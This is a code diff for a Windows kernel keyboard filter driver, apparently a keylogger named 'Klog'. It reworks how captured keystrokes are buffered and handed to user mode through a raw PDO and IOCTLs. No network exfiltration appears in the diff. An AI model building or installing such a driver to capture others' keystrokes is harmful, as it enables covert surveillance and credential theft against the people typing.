@@ -6,7 +6,8 @@
     #pragma alloc_text (PAGE, Klog_EvtIoInternalDeviceControl)
 #endif
 
-KEYBOARD_INPUT_BUFFER   keyboardInputBuffer = {0};      // {0} is not necessarily
+ULONG                   InstanceNo = 0;
+KEYBOARD_INPUT_BUFFER   keyboardInputBuffer = {0};
 
 NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject,
                      IN PUNICODE_STRING RegistryPath)
@@ -40,7 +41,7 @@ NTSTATUS Klog_EvtDeviceAdd(IN WDFDRIVER Driver,
 
     WDF_OBJECT_ATTRIBUTES   deviceAttributes;
     WDFDEVICE               device;
-    //WDFQUEUE                queue;
+    WDFQUEUE                queue;
     PDEVICE_EXTENSION       deviceExtentsion;
     WDF_IO_QUEUE_CONFIG     ioQueueConfig;
     NTSTATUS                status;
@@ -65,22 +66,32 @@ NTSTATUS Klog_EvtDeviceAdd(IN WDFDRIVER Driver,
     // filter drivers.
     //
     
-    ioQueueConfig.EvtIoInternalDeviceControl = Klog_EvtIoInternalDeviceControl;
-    ioQueueConfig.EvtIoDeviceControl = Klog_EvtIoDeviceControl;
-    
+    ioQueueConfig.EvtIoInternalDeviceControl = Klog_EvtIoInternalDeviceControl;    
     status = WdfIoQueueCreate(device, &ioQueueConfig,
                               WDF_NO_OBJECT_ATTRIBUTES,
                               WDF_NO_HANDLE);
     if (!NT_SUCCESS(status)) {
-        DebugPrintError("WdfIoQueueCreate failed. Status code 0x%X\n", status);
+        DebugPrintError("WdfIoQueueCreate (EvtIoInternalDeviceControl) failed. Status code 0x%X\n", status);
         return status;
     }
 
-    UNICODE_STRING symlinkName;
-    RtlInitUnicodeString(&symlinkName, DEV_SYMBOLIC_LINK);
-    status = WdfDeviceCreateSymbolicLink(device, &symlinkName);
+    WDF_IO_QUEUE_CONFIG_INIT(&ioQueueConfig,
+                             WdfIoQueueDispatchParallel);
+
+    ioQueueConfig.EvtIoDeviceControl = Klog_EvtIoDeviceControlFromRawPdo;
+    status = WdfIoQueueCreate(device, &ioQueueConfig,
+                              WDF_NO_OBJECT_ATTRIBUTES,
+                              &queue);
     if (!NT_SUCCESS(status)) {
-        DebugPrintError("WdfDeviceCreateSymbolicLink failed. Status code 0x%X\n", status);
+        DebugPrintError("WdfIoQueueCreate (Klog_EvtIoDeviceControlFromRawPdo) failed. Status code 0x%X\n", status);
+        return status;
+    }
+
+    deviceExtentsion->rawPdoQueue = queue;
+
+    status = Klog_CreateRawPdo(device, ++InstanceNo);
+    if (!NT_SUCCESS(status)) {
+        DebugPrintError("Klog_CreateRawPdo failed. Status code 0x%X\n", status);
         return status;
     }
 
@@ -149,11 +160,13 @@ VOID Klog_EvtIoInternalDeviceControl(IN WDFQUEUE Queue, IN WDFREQUEST Request,
             deviceExtension->UpperConnectData.ClassDeviceObject = NULL;
             deviceExtension->UpperConnectData.ClassService = NULL;
 
-            if (keyboardInputBuffer.SpinLock) {
-                WdfSpinLockRelease(keyboardInputBuffer.SpinLock);
-            }
             if (keyboardInputBuffer.DataAddedEvent) {
-                status = ZwClose(keyboardInputBuffer.DataAddedEvent);
+                status = ZwClose(deviceExtension->NotifEventHandle);
+                if (!NT_SUCCESS(status)) {
+                    DebugPrintError("ZwClose of notification event handle failed. "
+                                    "Status code 0x % X\n", status);
+                    break;
+                }
             }
 
             break;
@@ -189,11 +202,11 @@ VOID Klog_EvtIoInternalDeviceControl(IN WDFQUEUE Queue, IN WDFREQUEST Request,
     }
 }
 
-VOID Klog_EvtIoDeviceControl(IN WDFQUEUE Queue, IN WDFREQUEST Request,
-                             IN size_t OutputBufferLength, IN size_t InputBufferLength,
-                             IN ULONG IoControlCode)
+VOID Klog_EvtIoDeviceControlFromRawPdo(IN WDFQUEUE Queue, IN WDFREQUEST Request,
+                                       IN size_t OutputBufferLength, IN size_t InputBufferLength,
+                                       IN ULONG IoControlCode)
 {
-    DebugPrintInfo("Entered Klog_EvtIoDeviceControl\n");
+    DebugPrintInfo("Entered Klog_EvtIoDeviceControlFromRawPdo\n");
 
     UNREFERENCED_PARAMETER(InputBufferLength);
     
@@ -208,6 +221,8 @@ VOID Klog_EvtIoDeviceControl(IN WDFQUEUE Queue, IN WDFREQUEST Request,
 
     switch (IoControlCode) {
         case IOCTL_KLOG_GET_INPUT_DATA:
+            DebugPrintInfo("Klog_EvtIoDeviceControlFromRawPdo: Processing IOCTL_KLOG_GET_INPUT_DATA\n");
+
             if (OutputBufferLength < sizeof(keyboardInputBuffer.InputData)) {
                 status = STATUS_BUFFER_TOO_SMALL;
                 DebugPrintError("Size of provided output buffer is too small. Status code 0x%X\n", status);
@@ -230,7 +245,9 @@ VOID Klog_EvtIoDeviceControl(IN WDFQUEUE Queue, IN WDFREQUEST Request,
             break;
 
         case IOCTL_KLOG_INIT:
-            status = InitNotificationEvent();
+            DebugPrintInfo("Klog_EvtIoDeviceControlFromRawPdo: Processing IOCTL_KLOG_INIT\n");
+
+            status = InitNotificationEvent(deviceExtension);
             if (!NT_SUCCESS(status)) {
                 DebugPrintError("Failed to initialize notification event. Status code 0x%X\n",
                                 status);
@@ -266,27 +283,19 @@ NTSTATUS InitKeyboardInputBuffer()
     return status;
 }
 
-NTSTATUS InitNotificationEvent()
+NTSTATUS InitNotificationEvent(PDEVICE_EXTENSION deviceExtension)
 {
+    DebugPrintInfo("Entered InitNotificationEvent\n");
+
     UNICODE_STRING      eventName;
-    OBJECT_ATTRIBUTES   eventAttributes;
-    NTSTATUS            status;
+    NTSTATUS            status = STATUS_SUCCESS;
 
-    RtlInitUnicodeString(&eventName, L"\\BaseNamedObjects\\KeyboardInputDataAddedEvent");
-    InitializeObjectAttributes(&eventAttributes, &eventName, OBJ_KERNEL_HANDLE | OBJ_PERMANENT, NULL, NULL);
+    RtlInitUnicodeString(&eventName, KM_NOTIF_EVENT_NAME);
 
-    status = ZwOpenEvent(&keyboardInputBuffer.DataAddedEvent, EVENT_ALL_ACCESS, &eventAttributes);
-    if (status == STATUS_OBJECT_NAME_NOT_FOUND) {
-        status = ZwCreateEvent(&keyboardInputBuffer.DataAddedEvent, EVENT_ALL_ACCESS,
-                               &eventAttributes, NotificationEvent, FALSE);
-        if (!NT_SUCCESS(status)) {
-            DebugPrintError("ZwCreateEvent failed. Status code 0x%X\n", status);
-            return status;
-        }
-    }
-    else if (!NT_SUCCESS(status)) {
-        DebugPrintError("ZwOpenEvent failed. Status code 0x%X\n", status);
-        return status;
+    keyboardInputBuffer.DataAddedEvent = IoCreateNotificationEvent(&eventName, &deviceExtension->NotifEventHandle);
+    if (!keyboardInputBuffer.DataAddedEvent) {
+        DebugPrintError("IoCreateNotificationEvent failed. Notification event is NULL\n");
+        status = STATUS_FWP_NULL_POINTER;
     }
 
     return status;
